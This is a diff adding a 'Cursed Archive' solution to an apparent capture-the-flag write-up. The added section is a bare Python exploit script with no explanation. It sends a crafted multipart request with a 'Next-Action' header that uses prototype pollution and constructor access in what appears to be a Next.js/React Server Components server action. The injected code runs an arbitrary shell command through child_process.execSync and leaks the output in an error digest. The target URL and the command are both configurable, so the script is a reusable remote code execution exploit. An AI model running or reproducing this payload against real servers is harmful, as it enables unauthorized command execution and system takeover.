@@ -528,3 +528,38 @@ During enumeration, I discovered a `.env`. When I visited the `.env` path in the
 ```
 BYPASS_CTF{T0r_r0ut314}
 ```
+
+### Cursed Archive
+##### Sol:
+
+```python
+import requests
+import sys
+import json
+
+TARGET_URL = sys.argv[1] if len(sys.argv) > 1 else "http://20.196.144.202:3000"
+EXECUTABLE = sys.argv[2] if len(sys.argv) > 2 else "ls"
+
+crafted_chunk = {
+    "then": "$1:__proto__:then",
+    "status": "resolved_model",
+    "reason": -1,
+    "value": '{"then": "$B0"}',
+    "_response": {
+        "_prefix": f"var res = process.mainModule.require('child_process').execSync('{EXECUTABLE}',{{'timeout':5000}}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});",
+        "_formData": {
+            "get": "$1:constructor:constructor",
+        },
+    },
+}
+
+files = {
+    "0": (None, json.dumps(crafted_chunk)),
+    "1": (None, '"$@0"'),
+}
+
+headers = {"Next-Action": "x"}
+res = requests.post(TARGET_URL, files=files, headers=headers, timeout=10)
+print(f"Status: {res.status_code}")
+print(f"Response: {res.text}")
+```
